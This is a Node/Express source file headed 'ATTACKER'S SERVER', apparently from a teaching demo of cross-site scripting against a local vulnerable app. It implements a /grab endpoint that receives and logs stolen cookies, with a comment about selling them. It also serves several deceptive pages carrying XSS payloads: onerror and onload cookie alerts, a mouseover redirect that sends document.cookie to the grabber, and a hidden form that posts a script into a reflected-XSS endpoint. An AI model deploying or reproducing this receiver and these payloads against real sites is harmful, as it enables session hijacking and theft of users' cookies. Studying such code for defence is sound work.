// #################################
// ##### ATTACKER'S SERVER #########
// #################################

const express = require('express'); 
const body_parser = require('body-parser');

const port = 4001;
const server = express();

server.use(body_parser.json()); // parse JSON (application/json content-type)
server.use(body_parser.urlencoded()) // parse HTML form data

// XSS - cookie grabber
server.get("/grab", (req, res) => {
    const stolenCookies = req.query
    // 😈 this can be saved to file, then distributed to black market, etc
    console.log("stolenCookies: ", stolenCookies)

    res.json({
        message: "cookies successfully stolen"
    })
})

server.get("/hidden-xss", (req, res) => {
    res.send(`
        <h1>A nice site, definitely safe, not controlled by attacker</h1>
        <img src=x onerror='alert(document.cookie);' />
    `)
})

server.get("/hidden-xss-2", (req, res) => {
    res.send(`
        <body onload='alert(document.cookie);'>
            <h1>A nice site, definitely safe, not controlled by attacker</h1>
        </body>
    `)
})

server.get("/hidden-xss-3", (req, res) => {
    res.send(`
        <h1>A nice site, definitely safe, not controlled by attacker</h1>
        hover me for goodies
        <br />
        <img src="https://media.istockphoto.com/id/451602553/vector/free-download-button-vector-illustration.jpg?s=612x612&w=0&k=20&c=Gwr2L7v3T_DInAJOSj824gzhd70YBuZPl3D5_3jy9U8=" 
        width="300" height="300" 
            onmouseover="window.location.href = '/grab?cookies=' + escape(document.cookie)"
        />
    `)
})

server.get("/hidden-xss-4", (req, res) => {
    res.send(`
        <h1>A nice site, definitely safe, not controlled by attacker</h1>
        click me for goodies
        <br />
        <form method="post" action="http://localhost:4000/reflected-3">
            <button type="submit">
                <input type="hidden" name="name" 
                    value="<script>alert(document.cookie)</script>" />
                <img src="https://media.istockphoto.com/id/451602553/vector/free-download-button-vector-illustration.jpg?s=612x612&w=0&k=20&c=Gwr2L7v3T_DInAJOSj824gzhd70YBuZPl3D5_3jy9U8="
                    width="300" height="300" 
                />
            </button>
        </form>
    `)
})

server.get("/lenny", (req, res) => {
    res.json({ name: "Lenny" })
})

server.listen(port, () => { // Callback function in ES6
	console.log(`Server listening at ${port}`);
});